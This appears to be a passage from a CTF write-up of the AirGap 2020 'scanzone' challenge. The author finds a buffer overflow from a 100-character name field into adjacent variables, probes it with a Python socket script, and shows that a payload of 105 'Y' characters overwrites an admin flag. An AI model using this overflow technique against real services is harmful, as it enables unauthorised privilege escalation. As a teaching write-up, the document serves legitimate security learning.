<img class="center" src="/ta/img/airgap-2020/scanzone_3.png" />

Interesting, now we've got an asterisk. Wait, isn't the ASCII character for `42` an asterisk? Let's add another character to our name, bringing us up to 101 characters.

<img class="center" src="/ta/img/airgap-2020/scanzone_4.png" />

Wait, I didn't put my age as `65`. You know what is `65` though? The ASCII code for capital `A`. That's right, we've got a buffer overflow from the name variable (100 characters) into the age variable. In our collective head, we might imagine the server application looking like this...

```cpp
char name[100];
int age;
// .. other variables .. 
```

In memory, this looks like...

```
+---------------+-------+-------------+
|  NAME [100]   |  AGE  |  Other vars |
+---------------+-------+-------------+
```

Note how they're stored back to back. So if name can only hold 100 characters, and we give it 101, we end up in the age field. Let's guess that the age is an integer, which means we should be able to give 104 characters to completely override both the name and age variables. To confirm age is an integer (4 bytes) we can check that there should be no difference in age for 104 and 105 characters. Let's write a python script to help with that.

```python
import socket

def query(payload, age):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect(('ctf.airgapp.in', 3456))

  print("<- " + sock.recv(1024).rstrip()) # rstrip to remove newline
  print("-> " + payload)
  sock.send(payload + b'\n')
  print("<- " + sock.recv(1024).rstrip())
  sock.send(age + b'\n')
  print("-> " + age)
  print("<- " + sock.recv(1024).rstrip())
  print("<- " + sock.recv(1024).rstrip())

print("=== 104 ===")
query('A'*104, '12')
print("")
print("=== 105 ===")
query('A'*105, '12')
```

As expected there is no difference in age, so we can assume age is indeed an integer of 4 bytes.

<img class="center" src="/ta/img/airgap-2020/scanzone_5.png" />

### Trying and failing to get admin
We know at least the local variables look something like this
```cpp
char name[100];
int age;
// .. other variables ..
```

The question is what are these other variables? Well, there must be a validity check for admin somewhere. I'm going to hazard a guess and say it's a boolean...

```cpp
char name[100]
int age;
bool is_admin;
// .. other variables ..
```

If this is the case, we should be able to override it with anything that isn't 0 to gain access. Let's give it a try....

```python
query('A'*108, '12')  # 100 for name, 4 for age, 4 for boolean
```

<img class="center" src="/ta/img/airgap-2020/scanzone_6.png" />

Hmm. Maybe there's more variables inbetween it. Let's try going for 120 characters...

<img class="center" src="/ta/img/airgap-2020/scanzone_7.png" />

140?

<img class="center" src="/ta/img/airgap-2020/scanzone_8.png" />

We've got a weird character on the end, that looks like progress. Let's add another character, 141 this time...

<img class="center" src="/ta/img/airgap-2020/scanzone_9.png" />

Now the name doesn't print at all, but we're still not admin. 142?

<img class="center" src="/ta/img/airgap-2020/scanzone_10.png" />

Looks like we've gone too far again...

**This went on forever**. This is where I left off when the CTF closed. I kept trying different combinations of age and name, different payload sizes, everything. But none of that was the issue...

### What the variables _actually_ looked like
A few days later, I came back to this challenge with fresh eyes. It was obvious that the admin check wasn't a boolean. Could it be a string, like a name and age to match? Spoiler: nope.

Then I tried the magic payload, the payload to end it all:
```python
query('Y'*105, '12')
```

<img class="center" src="/ta/img/airgap-2020/scanzone_11.png" />

<h1>🏴🎉 F I N A L L Y 🎉🏴</h1>

So what did I get wrong? Well, the variables weren't these...
```cpp
char name[100]
int age;
bool is_admin;
// ...
if (is_admin)
  // ...
```

They were these...
```cpp
char name[100]
int age;
char is_admin = 'N';
// ...
if (is_admin == 'Y')
  // ...
```

The admin check was a character, either `Y` or `N` for yes/no. It's crazy how you can overlook something so simple by thinking too much like a programmer and not enough like a human.

Oh, and to add insult to injury you can purchase a hint for the scanzone challenge for 75 credits (scanzone awards 200 if you find the flag). I wonder what the hint is...

<img class="center" src="/ta/img/airgap-2020/scanzone_hint.png" />

......